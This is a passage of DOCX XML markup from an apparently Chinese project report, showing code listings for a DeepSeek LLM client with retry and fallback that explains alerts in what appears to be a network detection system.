      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """把完整提示词拼出来，便于测试与答辩时展示。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42202C95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return json.dumps(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F66439A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        {"system": SYSTEM, "user": build_diagnosis(alert, evidence, chunks)},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5391BDF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ensure_ascii=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E672C73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        indent=2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9D20AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324E72F5">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68E25578">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-22　llm/client.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（138 行）　M4 大模型客户端与降级</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018E633C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M4 大模型客户端：DeepSeek（OpenAI 兼容协议），带重试与降级。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35375F23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="601186EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>三条工程约束：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FD9624">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="066F1ECC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>1. **不把 key 写进配置**。config.yaml 只记环境变量名，运行时读取。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043D2CEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>2. **大模型不可用不能拖垮检测链路**。小模型已经给出类别与置信度，LLM 只负责解释；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3656C689">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   接口失败时降级成一份模板报告，并显式标注"自动生成、未经模型润色"，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE51098">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   而不是让上报接口超时、把探针一起拖死。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F19C15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>3. **超时与重试分开控制**。诊断走后台任务，超时给宽一点；追问是同步交互，给紧一点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEDE31E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466A9237">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B69E94C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168F5E53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57D6DDAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A87F47A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7F95D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F128943">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import httpx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19632231">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2471701C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from llm.schema import Diagnosis, parse_diagnosis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDAD514">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from llm.prompts import SYSTEM, build_chat, build_diagnosis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15676B8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35194B76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18521DF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class LLMUnavailable(RuntimeError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F181438">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5742EB4E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E072C87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D3EBA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class LLMClient:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EF0ECB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, cfg: dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB4CA35">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.provider = cfg.get("provider", "deepseek")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296E2DD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.base_url = cfg.get("base_url", "https://api.deepseek.com").rstrip("/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C64177F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.model = cfg.get("model", "deepseek-chat")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9EB169">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.api_key_env = cfg.get("api_key_env", "DEEPSEEK_API_KEY")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57470674">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.temperature = cfg.get("temperature", 0.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17488CD0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.timeout = cfg.get("timeout", 30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55504DA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.max_retries = cfg.get("max_retries", 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9EA0F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.max_tokens = cfg.get("max_tokens", 1500)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA020F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.calls = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063CB867">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.failures = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326E48AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="736A4F8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @property</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF24D09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def available(self) -&gt; bool:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747B0594">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return bool(os.environ.get(self.api_key_env))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCDDCCD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2307EAE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _chat(self, system: str, user: str, timeout_s: float, json_mode: bool = False) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B32B94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        key = os.environ.get(self.api_key_env)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE46A8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not key:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC77C54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise LLMUnavailable(f"环境变量 {self.api_key_env} 未设置")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C601868">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76DE9356">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        payload = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E85934">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "model": self.model,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234036B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "messages": [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4FB9A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                {"role": "system", "content": system},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3AD6C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                {"role": "user", "content": user},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A62B09D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7C829D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "temperature": self.temperature,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F93F62">
      <w:pPr>
        <w:widowControl w:val="0"/>
